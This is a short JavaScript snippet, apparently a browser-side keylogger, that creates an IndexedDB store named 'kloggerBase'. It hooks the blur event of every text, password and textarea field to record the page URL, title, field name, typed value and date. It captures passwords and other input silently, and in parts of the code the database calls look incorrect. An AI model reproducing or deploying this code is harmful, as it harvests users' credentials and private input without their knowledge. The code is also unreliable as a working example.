    //set up local database
    //isSupported = "indexedDB" in window
    var db = null;
    var store
    if("indexedDB" in window)
    {
        var openReq = indexedDB.open("kloggerBase",2,function(){
            alert("database Opened");
        });
        openReq.onupgradeneeded = function(e){
            console.log("upgrading db...");
            var newDb = e.target.result;
            if(!newDb.objectStoreNames.contains("inputLogs")){
                newDb.createObjectStore("inputLogs");
            }
        }

        openReq.onsuccess = function(e){
            console.log("db was opened successfully");
            db = e.target.result;
            setTimeout(function(){
                try
                {
                    store = db.transaction(["inputLogs"],"readWrite");
                }
                catch(e){
                    console.log(e);
                }

            },3000)

        }

        openReq.onerror = function(e)
        {
            console.log(e);
        }
    }

    //log object to hold data
    var log={
        link:null,
        pageTitle:null,
        inputName:null,
        data:null,
        date:null
    }

    //attach listeners to textareas and input fields suchs as password and textboxes
    var allInputs = $("[type=text],[type=password],textarea");
    allInputs.each(function()
    {
        var el=$(this)
        var originalFn =el.blur;

        el.blur(function(){
            log.link = window.location.href;
            log.pageTitle = $('title').text();
            log.inputName = this.name;
            log.data= this.value;
            log.date = new Date().toDateString();
            if(log.data !== ""){
                storeLog(log);
            }
            el.blur = originalFn;
            //el.trigger('blur');
        })
    });

    //initialise and create datastore
    function storeLog(log){
        var storeReq = store.add(log);
        storeReq.onerror =function(e){
            console.log("Error",e.target.error.name)
        }
        storeReq.onsuccess= function(e){
            console.log("New Input log added");
        }
    }